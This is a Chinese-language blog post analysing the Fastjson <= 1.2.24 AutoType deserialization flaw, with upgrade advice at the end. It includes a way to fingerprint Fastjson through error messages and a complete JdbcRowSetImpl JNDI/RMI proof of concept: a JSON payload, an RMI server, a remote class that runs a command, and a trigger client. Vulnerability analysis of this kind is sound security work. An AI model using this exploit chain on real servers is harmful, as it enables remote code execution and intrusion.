## 前言

Fastjson 是阿里巴巴开源的JSON解析库。可以将 Java 对象转换为 JSON 格式，当然也可以将 JSON 字符串转换为 Java
对象。Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。

Github链接：<https://github.com/alibaba/fastjson>

## Fastjson序列化与反序列化

fastjson序列化与反序列化的两种方式：基于属性 和 基于getter/setter 。

举个很粗糙的例子简要理解一些基于getter/setter 方式：

    
    
    class Apple implements Fruit {
        private Big_Decimal price;
        //省略 getter/setter/toString等
    }
    
    class iphone implements Fruit {
        private Big_Decimal price;
        //省略 getter/setter/toString等
    }
    

在传入参数后，比如Apple 5块钱，iphone 5000块。序列化成json字符串之后是这个样子的：

    
    
    toJSONString:{"fruit":{"price":5}}
    
    toJSONString:{"fruit":{"price":5000}}
    

看到序列化之后的json字符串，将这两串json字符串反序列化成java对象的时候问题来了，只看json字符串是无法区分Apple跟iphone的。所以反序列化后会混淆。是5000块的苹果
？还是5块钱的iPhone ？

所以Fastjson引入了`AutoType`（基于属性），在序列化的时候，把原始的类型也记录下来：

    
    
    {
        "fruit":{
            "@type":"com.hollis.lab.fastjson.test.Apple",
            "price":5
        }
    }
    

就是这个`@type`属性，记录下了原始类的名字，这样就很直接的 Apple
5块钱，而不至于toJSONString后产生混淆。但是，问题又来了，因为`@type`的值没有进行任何的校验，配合一下可以利用的类（如：JdbcRowSetImpl），那么反序列化漏洞就出来了。

## 判断漏洞存在性

只要是json传输数据就去尝试：故意把json数据格式写错，试着让服务器返回报错，如果看到 com.alibaba,fastjson.JSON
，就说明服务器用了fastjson ，那就用poc去测一下吧。

## 漏洞影响版本

fastjson <= 1.2.24 ,利用链：JdbcRowSetImpl

## JdbcRowSetImpl利用链

JdbcRowSetImpl利用链最终的结果往往是导致JNDI注入，通常使用`RMI+JNDI`进行利用。

> RMI：远程方法调用(Remote Method
> Invocation)。能够让在客户端Java虚拟机上的对象像调用本地对象一样调用服务端Java虚拟机中的对象上的方法。类比一下http协议，ftp协议这类，在浏览器上使用rmi协议获取rmi服务器中的资源。

POC：

    
    
    {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}
    

说明：`@type`指向`com.sun.rowset.JdbcRowSetImpl`类，`dataSourceName`值为RMI服务中心绑定的Exploit服务，`autoCommit`有且必须为`true`或`false`等布尔值类型：

服务端JNDIServer.java ：

    
    
    public class JNDIServer {
        public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference reference = new Reference("Exloit",
                    "badClassName","http://127.0.0.1:8000/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("Exploit",referenceWrapper);
        }
    }
    

远程恶意类badClassName.class :

    
    
    public class badClassName {
        static{
            try{
                Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
            }catch(Exception e){
                ;
            }
        }
    }
    

客户端JNDIClient.java :

    
    
    import com.alibaba.fastjson.JSON;
    
    public class JNDIClient {
        public static void main(String[] argv){
            String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/badClassName\", \"autoCommit\":true}";
            JSON.parse(payload);
        }
    }
    

## 漏洞分析

    
    
    {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}
    

为什么在poc中要使用 JdbcRowSetImpl
这个类？其他的不行吗？首先，JdbcRowSetImpl它是java里自带的类，所以保证了你一定能找到这个类，我们进入研究一下`JdbcRowSetImpl.class`类的代码，在它执行反序列化的时候，`dataSourceName`的值被传参进去。  
![image](https://image.3001.net/images/20210926/1632624905_614fe109e294032971b15.png!small)

再看poc中的`autoCommit`属性。  
![image](https://image.3001.net/images/20210926/1632624933_614fe125b032c8e267e17.png!small)

判断 this.conn 值是否为空，第一次初始化，肯定为空的，所以走到 this.conn = this.connect(); 跟进，  
![image](https://image.3001.net/images/20210926/1632624962_614fe142176ee16eeb0d4.png!small)

看到第333行，`DataSource var2 = (DataSource)varl.lookup(this.getDataSourceName())`

调用`lookup`方法加载`dataSourceName`的值，并返回给 DataSource var2 。

所以一旦把这个类`"@type":"com.sun.rowset.JdbcRowSetImpl"`反序列化，就会调用`setDataSourceName(var)`方法并且`"autoCommit":true`设置了的话，就远程加载了
rmi服务器上攻击者设置的恶意的类。

## 修复建议

Fastjson更新到最新版。

 **作者介绍：**

`Bitores`,无尽安全实验室团队成员之一。一个梦想着某天能顺着网线去拿下你内网域控主机的练习时长两年的渗透测试练习生。擅长 web/内网
渗透测试，分析常见漏洞，跟踪分析研究最新漏洞并提供漏洞修复方案。偶尔php代码审计分析，攻防演练，红蓝对抗，配合应急响应处置突发安全事件。

